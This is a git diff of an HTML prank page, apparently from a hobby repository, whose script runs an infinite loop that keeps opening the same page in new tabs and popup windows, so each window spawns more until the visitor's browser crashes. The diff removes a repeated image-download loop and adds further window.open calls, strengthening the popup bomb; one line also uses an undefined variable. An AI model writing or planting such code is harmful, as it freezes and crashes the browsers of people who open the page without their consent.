@@ -1,24 +1,10 @@
 <h1>Ohhhh my lawd she done crashed my shiaaaatttt</h1>
 <script>
-  function downloadImage(imageUrl, filename) {
-    fetch(imageUrl)
-        .then(response => response.blob())
-        .then(blob => {
-            const objectURL = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = objectURL;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(objectURL);
-        })
-        .catch(error => console.error('Error downloading image:', error));
-  }
   while (true){
-    downloadImage('https://github.com/TheCrazy8/Get-Shot-at-by-a-Nine-Year-Old-Similator/blob/main/zesty.jpeg?raw=true', 'zesty.jpeg');
     window.open("https://thecrazy8.github.io/Get-Shot-at-by-a-Nine-Year-Old-Similator/ShitMyCrash.html", "_blank").focus()
+    window.open("https://thecrazy8.github.io/Get-Shot-at-by-a-Nine-Year-Old-Similator/ShitMyCrash.html", "YouGotShotByANineYearOld", "width=800,height=600,left=100,top=100,resizable=yes,scrollbars=yes")
     window.open("https://thecrazy8.github.io/Get-Shot-at-by-a-Nine-Year-Old-Similator/ShitMyCrash.html", "_blank").focus()
+    window.open("https://thecrazy8.github.io/Get-Shot-at-by-a-Nine-Year-Old-Similator/ShitMyCrash.html", "YouGotShotByANineYearOld", "width=800,height=600,left=100,top=100,resizable=yes,scrollbars=yes")
     popupWindow = window.open(url,'popUpWindow','height=181,width=666,left=3,top=222')
   }
 </script>
